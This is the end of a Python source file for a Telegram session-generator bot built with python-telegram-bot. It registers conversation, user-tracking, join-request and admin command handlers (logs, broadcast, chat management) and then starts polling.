                MessageHandler(filters.TEXT & ~filters.COMMAND, get_password),
            ],
        },
        fallbacks=[
            CallbackQueryHandler(cancel, pattern="^cancel_process$"),
            CommandHandler("cancel", cancel),
            (CallbackQueryHandler(verify_callback, pattern="^verify_sub$")),
        ],
        per_message=False,
    )
        # User tracking middleware — sabse pehle chalega (group=-1)
    app.add_handler(TypeHandler(Update, track_user_middleware), group=-1)
    app.add_handler(ChatMemberHandler(track_chat_member_updates, ChatMemberHandler.CHAT_MEMBER))
    app.add_handler(CallbackQueryHandler(verify_callback, pattern="^verify_sub$"))
    app.add_handler(ChatJoinRequestHandler(track_join_request))
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("getlogs", get_logs_pdf))
    app.add_handler(CommandHandler("clearlogs", clear_logs))
    app.add_handler(CommandHandler("off", bot_off))
    app.add_handler(CommandHandler("on", bot_on))
    app.add_handler(CommandHandler("broadcast", manual_broadcast))
    app.add_handler(CommandHandler("addchat", add_chat))
    app.add_handler(CommandHandler("delchat", del_chat))
    app.add_handler(CommandHandler("listchats", list_chats))
    app.add_handler(conv_handler)

    print("Ultimate Multi-Session Generator Bot (PTB) is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
